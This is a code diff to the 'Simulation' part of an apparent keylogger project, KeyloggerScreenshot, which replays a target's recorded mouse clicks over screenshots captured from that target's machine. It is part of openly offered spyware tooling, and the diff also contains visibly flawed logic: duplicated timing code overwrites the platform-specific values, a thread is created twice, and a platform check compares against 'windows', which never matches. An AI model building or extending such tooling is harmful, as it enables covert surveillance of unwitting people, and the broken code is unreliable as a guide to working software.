@@ -57,16 +57,17 @@ class Simulation:
         startbutton.configure(bg="red")
         # This is the button
         startbutton["text"] = "Stop simulation"
-        data = subprocess.check_output("tasklist")
-        str_data = str(data).split()
-        all_exe = [(exe.replace(r"K\\r\\n", "").replace(r"K\r\n", ""), str_data[idx + 1]) for idx, exe in enumerate(str_data) if ".exe" in exe]
-        photo = []
-        for task, pid in all_exe:
-            if task == "PhotosApp.exe":
-                photo.append((task, pid))
+        if sys.platform == "windows":
+            data = subprocess.check_output("tasklist")
+            str_data = str(data).split()
+            all_exe = [(exe.replace(r"K\\r\\n", "").replace(r"K\r\n", ""), str_data[idx + 1]) for idx, exe in enumerate(str_data) if ".exe" in exe]
+            photo = []
+            for task, pid in all_exe:
+                if task == "PhotosApp.exe":
+                    photo.append((task, pid))
 
-        if photo:
-            os.system(f"taskkill /f /PID {photo[0][1]}")
+            if photo:
+                os.system(f"taskkill /f /PID {photo[0][1]}")
         os._exit(0)
 
     @staticmethod
@@ -77,10 +78,10 @@ class Simulation:
     def start_simulation():
         global seconds
         mouse_coordinates = [mouse for mouse in os.listdir() if "mouseInfoLog" in mouse]
-        #Looks for coordinates in mouseInfoLog
+        # Looks for coordinates in mouseInfoLog
 
         if not mouse_coordinates:
-            #If there isn't a file called mouseInfoLog it will destroy itself
+            # If there isn't a file called mouseInfoLog it will destroy itself
             print("\nThe target hasn't clicked anything")
             print("THANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
             sys.exit()
@@ -91,41 +92,67 @@ class Simulation:
             for line in fhandle:
                 if "[" in line:
                     every_coordinate += ast.literal_eval(line)
-                    #This makes a list out of a string
+                    # This makes a list out of a string
 
         img_files = [each_img for each_img in os.listdir() if "New_Image" in each_img]
-        #This checks for all Images in the directory
+        # This checks for all Images in the directory
 
         if not img_files:
             print('There is no "New_Image" in this directory')
             sys.exit()
 
+
         pg.FAILSAFE = False
-        #This is for the corner allowance
+        # This is for the corner allowance
         img_seconds = 5.572
-        #This is the speed it takes to open the image
+        # This is the speed it takes to open the image
         speed = 0.47
-        #This is the time each coordinate needs
+        # This is the time each coordinate needs
         sleep = 1.5
-        #This is the time where the code is taking a time out
+        # This is the time, where the code is taking a time out
         one_coordinate = speed + sleep
+
+        if sys.platform != "linux": # This calculation is for windows
+            # This is for the corner allowance
+            img_seconds = 5.572
+            # This is the speed it takes to open the image
+            speed = 0.47
+            # This is the time each coordinate needs
+            escape = 0.1
+            # This is the time the program needs to escape an image
+            one_coordinate = speed + sleep
+            duration_seconds = one_coordinate * len(every_coordinate)
+            one_image = duration_seconds + img_seconds + escape
+            seconds = round(one_image * len(img_files))
+            # This calculates the amount it will take
+
+        else:
+            # Same code as above but this is for linux
+            open_img = 2.7
+            one_cor = 1.9
+            all_cor = one_cor * len(every_coordinate)
+            esc = 0.1
+            this_img = all_cor + open_img + esc
+            seconds = round(this_img * len(img_files))
 
         duration_seconds = one_coordinate * len(every_coordinate)
         one_image = duration_seconds + img_seconds
         summed_up = one_image * len(img_files)
         seconds = round(summed_up)
-        #This calculates the amount it will take
+        # This calculates the amount it will take
 
         print(f"\nThe target has clicked {len(every_coordinate)} times on his screen")
+        threading_count = threading.Thread(target=Simulation.countdown, args=(seconds, ))
+        # The countdown will start
         threading_count = threading.Thread(target=Simulation.countdown)
-        #The countdown will start
+        # The countdown will start
         threading_count.start()
 
         pg.sleep(4)
         for image in img_files:
             im = PIL.Image.open(image)
             try:
-                #Opens the image
+                # Opens the image
                 im.show()
                 time.sleep(2)
                 pg.press("f11")
@@ -137,3 +164,5 @@ class Simulation:
             except RuntimeError:
                 bp.color('\n\nTry to run "python Simulation_code.py" in your terminal.\nIf this did not work try to clone my project on github: https://github.com/Kill0geR/KeyloggerScreenshot',"red")
                 os._exit(0)
+
+Simulation.start_simulation()
